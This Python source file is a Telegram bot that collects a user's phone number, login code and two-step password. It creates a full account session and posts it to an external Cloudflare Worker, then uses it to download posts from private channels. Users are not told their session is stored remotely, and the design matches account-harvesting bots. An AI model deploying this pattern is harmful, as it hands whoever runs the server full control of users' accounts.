import os, asyncio, requests
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CLOUDFLARE_API = os.getenv("CLOUDFLARE_API")  # Worker URL

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Send /login to connect your account.")

async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await update.message.reply_text("📱 Please enter your phone number with country code (e.g. +919876543210):")
    context.user_data["awaiting_phone"] = True

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    text = update.message.text

    # Handle phone number input
    if context.user_data.get("awaiting_phone"):
        phone = text.strip()
        await update.message.reply_text("⏳ Sending code to your Telegram... please wait.")

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        sent = await client.send_code_request(phone)
        context.user_data.update({"awaiting_phone": False, "awaiting_code": True, "phone": phone, "client": client})
        await update.message.reply_text("💬 Enter the code you received:")
        return

    # Handle login code
    if context.user_data.get("awaiting_code"):
        code = text.strip()
        client = context.user_data["client"]
        phone = context.user_data["phone"]

        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            await update.message.reply_text("🔒 Two-step verification is enabled. Please enter your password:")
            context.user_data.update({"awaiting_password": True})
            return

        session_str = client.session.save()
        await client.disconnect()
        requests.post(f"{CLOUDFLARE_API}/save", json={"user_id": user_id, "session": session_str})
        await update.message.reply_text("✅ Logged in successfully! Now send any private post link.")
        context.user_data.clear()
        return

    # Handle password for 2FA
    if context.user_data.get("awaiting_password"):
        password = text.strip()
        client = context.user_data["client"]
        phone = context.user_data["phone"]

        await client.sign_in(phone=phone, password=password)
        session_str = client.session.save()
        await client.disconnect()
        requests.post(f"{CLOUDFLARE_API}/save", json={"user_id": user_id, "session": session_str})
        await update.message.reply_text("✅ Logged in successfully!")
        context.user_data.clear()
        return

    # Handle post link
    if "t.me/" in text:
        session_str = requests.post(f"{CLOUDFLARE_API}/get", json={"user_id": user_id}).text
        if "❌" in session_str:
            await update.message.reply_text("⚠️ You must /login first.")
            return

        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()

        try:
            parts = text.split("/")
            channel = parts[-2]
            msg_id = int(parts[-1])
            msg = await client.get_messages(channel, ids=msg_id)

            if msg.media:
                file_path = await msg.download_media()
                await update.message.reply_document(open(file_path, "rb"), caption=msg.text or msg.caption or "")
            else:
                await update.message.reply_text(msg.text or msg.caption or "")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
        finally:
            await client.disconnect()


app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("login", login))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

if __name__ == "__main__":
    app.run_polling()
